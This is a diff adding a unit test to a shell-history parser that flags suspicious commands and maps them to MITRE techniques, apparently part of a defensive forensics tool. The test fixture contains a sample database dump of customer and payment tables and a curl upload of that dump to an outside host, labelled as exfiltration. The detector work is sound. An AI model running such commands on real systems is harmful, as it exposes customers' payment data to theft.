@@ -81,6 +81,20 @@ describe("parseShellHistoryFile — classification + IOCs", () => {
     expect(sev.every((s) => s === "High")).toBe(true);
   });
 
+  it("flags a DB dump as Medium collection and a curl file-upload as Medium exfil — #199", () => {
+    const ops = [
+      "mysqldump -u veridia_app -pveridia-db-p455 veridia_prod customers payment_methods > /tmp/export-4291.sql",
+      "curl -X POST https://northlakeportal.com/api/sync -F \"data=@/tmp/export-4291.sql.gz\" --silent",
+    ].join("\n");
+    const r = parseShellHistoryFile(ops, { user: "deploy" });
+    const dump = r.events.find((e) => /mysqldump/.test(e.description));
+    expect(dump?.severity).toBe("Medium");
+    expect(dump?.mitreTechniques).toContain("T1005");
+    const exfil = r.events.find((e) => /curl -X POST/.test(e.description));
+    expect(exfil?.severity).toBe("Medium");
+    expect(exfil?.mitreTechniques).toContain("T1041");
+  });
+
   it("aggregates identical repeated commands into one counted row", () => {
     const r = parseShellHistoryFile("ls\nls\nls\nid", { user: "u" });
     const ls = r.events.find((e) => /: ls$/.test(e.description));
